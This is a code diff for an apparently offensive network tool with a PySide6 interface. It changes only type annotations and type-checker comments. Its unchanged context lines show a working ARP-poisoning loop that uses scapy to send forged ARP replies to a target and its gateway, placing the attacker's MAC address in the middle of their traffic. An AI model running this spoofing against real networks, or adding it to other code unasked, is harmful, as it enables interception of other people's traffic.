@@ -14,7 +14,7 @@ from typing import TYPE_CHECKING
 from core.mitm._scapy import SCAPY_AVAILABLE, ARP, Ether, sendp, conf
 
 if TYPE_CHECKING:
-    from PySide6.QtCore import Signal
+    from PySide6.QtCore import SignalInstance
 
 
 def run_arp_mitm(
@@ -23,8 +23,8 @@ def run_arp_mitm(
     attacker_mac: str,
     interval: float,
     running_flag: list[bool],
-    log_signal: Signal,  # type: ignore[type-arg]
-    packet_generated: Signal,  # type: ignore[type-arg]
+    log_signal: SignalInstance,
+    packet_generated: SignalInstance,
 ) -> None:
     """Continuously poison ARP tables on target and gateway.
 
@@ -42,14 +42,14 @@ def run_arp_mitm(
     )
     while running_flag[0]:
         try:
-            pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+            pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(  # type: ignore[misc, operator]
                 op=2, psrc=gateway_ip, hwsrc=attacker_mac, pdst=target_ip
             )
-            sendp(pkt1, verbose=0)
-            pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+            sendp(pkt1, verbose=0)  # type: ignore[misc]
+            pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(  # type: ignore[misc, operator]
                 op=2, psrc=target_ip, hwsrc=attacker_mac, pdst=gateway_ip
             )
-            sendp(pkt2, verbose=0)
+            sendp(pkt2, verbose=0)  # type: ignore[misc]
             packet_generated.emit(
                 {
                     "prefix": "L2",
